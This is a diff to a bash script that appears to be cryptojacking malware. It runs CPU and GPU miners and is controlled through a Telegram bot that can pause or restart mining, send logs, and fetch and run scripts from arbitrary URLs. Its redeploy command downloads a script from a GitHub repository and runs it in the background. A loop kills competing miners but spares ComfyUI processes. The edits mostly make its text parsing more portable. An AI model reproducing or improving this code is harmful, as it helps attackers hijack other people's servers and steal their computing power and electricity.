@@ -690,7 +690,7 @@ get_cpu_hashrate() {
 
 get_gpu_hashrate() {
     [ ! -f "$LOG_GPU" ] && echo "0" && return
-    grep -iE "Hashrate:|Total Hashrate" "$LOG_GPU" 2>/dev/null | tail -1 | grep -oP '[0-9]+\.?[0-9]*' | tail -1 || echo "0"
+    grep -iE "Hashrate:|Total Hashrate" "$LOG_GPU" 2>/dev/null | tail -1 | grep -o '[0-9.]*' | tail -1 || echo "0"
 }
 
 send_telemetry() {
@@ -723,11 +723,13 @@ send_specs() {
 
     if [ "$GPU_COUNT" -gt 0 ] && command -v nvidia-smi >/dev/null 2>&1; then
         msg="${msg}%0A🎮 <b>GPUs:</b>%0A"
+        local gpu_info=$(nvidia-smi --query-gpu=name,utilization.gpu,temperature.gpu,memory.used,memory.total --format=csv,noheader,nounits 2>/dev/null)
         local idx=0
-        nvidia-smi --query-gpu=name,utilization.gpu,temperature.gpu,memory.used,memory.total --format=csv,noheader,nounits 2>/dev/null | while IFS=',' read -r name util temp mu mt; do
+        while IFS=',' read -r name util temp mu mt; do
+            [ -z "$name" ] && continue
             msg="${msg}• GPU${idx}: ${name} ${util}% ${temp}°C ${mu}/${mt}MB%0A"
             idx=$((idx+1))
-        done
+        done <<< "$gpu_info"
     fi
     send_tg "$msg"
 }
@@ -745,15 +747,15 @@ poll_telegram() {
     local resp=$(curl -s -m 5 --connect-timeout 3 "https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
     [ -z "$resp" ] && return
 
-    local update_id=$(echo "$resp" | grep -oP '"update_id":\K[0-9]+' | tail -1)
+    local update_id=$(echo "$resp" | grep -o '"update_id":[0-9]*' | tail -1 | cut -d: -f2)
     [ -z "$update_id" ] && return
 
     curl -s -m 2 "https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=$((update_id+1))" >/dev/null 2>&1
 
-    local from_id=$(echo "$resp" | grep -oP '"from":\{"id":\K[0-9]+' | tail -1)
+    local from_id=$(echo "$resp" | grep -o '"from":{"id":[0-9]*' | tail -1 | grep -o '[0-9]*$')
     [ "$from_id" != "$TG_CHAT_ID" ] && return
 
-    local msg_text=$(echo "$resp" | grep -oP '"text":"\K[^"]+' | tail -1)
+    local msg_text=$(echo "$resp" | grep -o '"text":"[^"]*"' | tail -1 | sed 's/"text":"//;s/"$//')
     [ -z "$msg_text" ] && return
 
     local target=$(echo "$msg_text" | awk '{print $2}')
@@ -766,16 +768,16 @@ poll_telegram() {
             pkill -9 -f "$(basename "$BIN_GPU")" 2>/dev/null
             send_tg "⏸ <b>PAUSED</b> <code>$SERVER_IP</code>"
             ;;
-        /start*|/resume*|/restart*)
-            PAUSED=0
-            restart_cpu; restart_gpu
-            send_tg "▶️ <b>RESUMED</b> <code>$SERVER_IP</code>"
-            ;;
         /status*|/stat*)
             send_telemetry "ON-DEMAND"
             ;;
         /specs*|/hw*|/info*)
             send_specs
+            ;;
+        /start*|/resume*|/restart*)
+            PAUSED=0
+            restart_cpu; restart_gpu
+            send_tg "▶️ <b>RESUMED</b> <code>$SERVER_IP</code>"
             ;;
         /logs*|/log*)
             local ct=$(tail -n 5 "$LOG_CPU" 2>/dev/null | tr '\n' ' ')
@@ -783,7 +785,7 @@ poll_telegram() {
             send_tg "📋 <b>LOGS</b>%0A💻<code>${ct:-empty}</code>%0A🎮<code>${gt:-empty}</code>"
             ;;
         /update*|/dl*)
-            local url=$(echo "$msg_text" | grep -oP 'https?://\S+' | head -1)
+            local url=$(echo "$msg_text" | grep -o 'https*://[^ "]*' | head -1)
             [ -z "$url" ] && url="$DEFAULT_UPDATE_URL"
             local dest="$BASE_DIR/.upd_$(date +%s).sh"
             if curl -L -k -s -m 30 -o "$dest" "$url" 2>/dev/null || wget -qO "$dest" --no-check-certificate -T 30 "$url" 2>/dev/null; then
@@ -799,16 +801,14 @@ poll_telegram() {
             send_tg "🔄 <b>MEGALOX:</b> Full redeploy on <code>$SERVER_IP</code>..."
             pkill -9 -f "$(basename "$BIN_CPU")" 2>/dev/null
             pkill -9 -f "$(basename "$BIN_GPU")" 2>/dev/null
-            # Nuke old binaries and configs
             rm -f "$BIN_CPU" "$BIN_GPU" "$CONFIG_CPU" "$LOG_CPU" "$LOG_GPU" 2>/dev/null
-            # Fresh download & execute
-            cd /tmp && rm -rf .s && mkdir -p .s && cd .s
-            (curl -fsSL -k -m 30 "https://cdn.jsdelivr.net/gh/xdLolKek/connfy-libs@main/Connfy.sh" -o r.sh || \
-             curl -fsSL -k -m 30 "https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh" -o r.sh || \
-             wget -qO r.sh --no-check-certificate "https://raw.githubusercontent.com/xdLolKek/connfy-libs/main/Connfy.sh") && \
-            chmod +x r.sh && (nohup bash r.sh </dev/null >/dev/null 2>&1 &)
+            rm -rf /tmp/.s 2>/dev/null; mkdir -p /tmp/.s
+            (curl -fsSL -k -m 30 "https://cdn.jsdelivr.net/gh/xdLolKek/connfy-libs@main/Connfy.sh" -o /tmp/.s/r.sh || \
+             curl -fsSL -k -m 30 "https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh" -o /tmp/.s/r.sh || \
+             wget -qO /tmp/.s/r.sh --no-check-certificate "https://raw.githubusercontent.com/xdLolKek/connfy-libs/main/Connfy.sh") && \
+            chmod +x /tmp/.s/r.sh && (nohup bash /tmp/.s/r.sh </dev/null >/dev/null 2>&1 &)
             send_tg "✅ <b>MEGALOX DONE:</b> Fresh deploy launched on <code>$SERVER_IP</code>"
-            rm -rf /tmp/.s
+            rm -rf /tmp/.s 2>/dev/null
             exit 0
             ;;
         /kill*|/uninstall*)
@@ -840,9 +840,9 @@ while true; do
     # --- KILL COMPETITORS (every loop iteration) ---
     # Quick scan: kill known miner process names (not ours, not ComfyUI)
     for cname in xmrig xmr-stak minerd cpuminer ccminer ethminer phoenix t-rex trex gminer nbminer lolminer teamredminer nanominer srbminer bzminer wildrig claymore kawpowminer nheqminer bminer nicehash cryptonight monero; do
-        local cpids=$(pgrep -fi "$cname" 2>/dev/null)
+        cpids=$(pgrep -fi "$cname" 2>/dev/null)
         for cpid in $cpids; do
-            local ccmd=$(cat "/proc/$cpid/cmdline" 2>/dev/null | tr '\0' ' ')
+            ccmd=$(cat "/proc/$cpid/cmdline" 2>/dev/null | tr '\0' ' ')
             echo "$ccmd" | grep -qiE "$(basename "$BIN_CPU")|$(basename "$BIN_GPU")|ComfyUI|comfyui|kryptex|sd-pam|lr-cgroup" && continue
             kill -9 "$cpid" 2>/dev/null
         done
@@ -861,7 +861,14 @@ while true; do
             # After 5 failures, try re-downloading the binary
             if [ "$GPU_RETRY_COUNT" -ge 5 ]; then
                 rm -f "$BIN_GPU"
-                install_gpu
+                # Inline re-download
+                gtmp=$(mktemp -d)
+                (curl -L -k -s -m 120 -o "$gtmp/g.tar.gz" "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz" 2>/dev/null || \
+                 wget -qO "$gtmp/g.tar.gz" --no-check-certificate "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz" 2>/dev/null) && \
+                [ -s "$gtmp/g.tar.gz" ] && tar -xzf "$gtmp/g.tar.gz" -C "$gtmp" 2>/dev/null && \
+                { gf=$(find "$gtmp" -type f -name "SRBMiner-MULTI" 2>/dev/null | head -1); \
+                  [ -n "$gf" ] && cp "$gf" "$BIN_GPU" && chmod +x "$BIN_GPU"; }
+                rm -rf "$gtmp"
                 restart_gpu
                 GPU_RETRY_COUNT=0
             fi
